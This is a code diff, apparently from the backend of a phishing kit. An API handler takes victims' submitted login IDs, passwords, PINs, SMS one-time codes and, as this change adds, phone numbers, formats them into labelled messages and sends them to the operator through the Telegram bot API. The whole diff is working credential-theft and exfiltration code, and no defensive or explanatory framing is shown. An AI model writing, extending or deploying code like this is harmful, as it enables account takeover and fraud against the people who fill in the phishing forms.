@@ -15,6 +15,7 @@ export default async function handler(req, res) {
     PIN,
     sms_input,
     SMSERROR,
+    Número,
 
   } = req.body;
 
@@ -41,24 +42,30 @@ export default async function handler(req, res) {
   - Code: ${PINE}
     `;
 
-  }else if (sms_input ) {
-    // 🟢 رسالة الكارت
-    message = `
-    🔑 SMS recibido Login:
-    - sms: ${sms_input}
-     `;
-  }else if (id_no && password ) {
+  } else if (id_no && password ) {
     // 🟢 رسالة الكارت
     message = `
     🔑 Nouveau PIN Login:
     - Identifiant: ${id_no}
     - Mot de passe: ${password}
      `;
-} else if (SMSERROR ) {
+} else if (sms_input ) {
+  // 🟢 رسالة الكارت
+  message = `
+  🔑 SMS recibido Login:
+  - sms: ${sms_input}
+   `;
+}else if (SMSERROR ) {
   // 🟢 رسالة الكارت
   message = `
   🔑sms_input Login:
   - sms: ${SMSERROR}
+   `;
+}else if (Número ) {
+  // 🟢 رسالة الكارت
+  message = `
+  🔑número de teléfono:
+  - Número de telefone: ${Número}
    `;
 }
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
